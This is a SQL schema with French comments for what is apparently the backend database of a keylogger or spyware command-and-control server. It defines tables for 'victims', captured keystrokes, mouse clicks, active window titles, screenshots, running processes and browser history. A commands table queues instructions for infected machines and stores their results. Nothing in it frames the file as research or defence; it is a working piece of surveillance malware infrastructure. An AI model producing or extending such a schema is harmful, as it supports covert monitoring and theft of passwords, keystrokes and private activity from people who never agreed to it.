-- Table pour les victimes
CREATE TABLE IF NOT EXISTS victims (
    id TEXT PRIMARY KEY,
    system_info TEXT,
    network_info TEXT,
    first_seen TEXT,
    last_seen TEXT,
    status TEXT DEFAULT 'active'
);

-- Table pour les logs de frappes
CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    keystrokes TEXT,
    timestamp TEXT,
    FOREIGN KEY (victim_id) REFERENCES victims (id)
);

-- Table pour les clics de souris
CREATE TABLE IF NOT EXISTS mouse_clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    x INTEGER,
    y INTEGER,
    button TEXT,
    window TEXT,
    timestamp TEXT,
    FOREIGN KEY (victim_id) REFERENCES victims (id)
);

-- Table pour les fenêtres actives
CREATE TABLE IF NOT EXISTS active_windows (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    title TEXT,
    timestamp TEXT,
    FOREIGN KEY (victim_id) REFERENCES victims (id)
);

-- Table pour les captures d'écran (stocke le NOM du fichier, pas l'image)
CREATE TABLE IF NOT EXISTS screenshots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    filename TEXT,
    timestamp TEXT,
    FOREIGN KEY (victim_id) REFERENCES victims (id)
);

-- Table pour les processus
CREATE TABLE IF NOT EXISTS processes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    pid INTEGER,
    name TEXT,
    username TEXT,
    timestamp TEXT,
    FOREIGN KEY (victim_id) REFERENCES victims (id)
);

-- Table pour l'historique du navigateur
CREATE TABLE IF NOT EXISTS browser_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    url TEXT,
    title TEXT,
    timestamp TEXT,
    FOREIGN KEY (victim_id) REFERENCES victims (id)
);

-- Table pour les commandes à envoyer aux victimes
CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    command TEXT,
    status TEXT DEFAULT 'pending',
    result TEXT,
    timestamp TEXT,
    executed_at TEXT,
    FOREIGN KEY (victim_id) REFERENCES victims (id)
);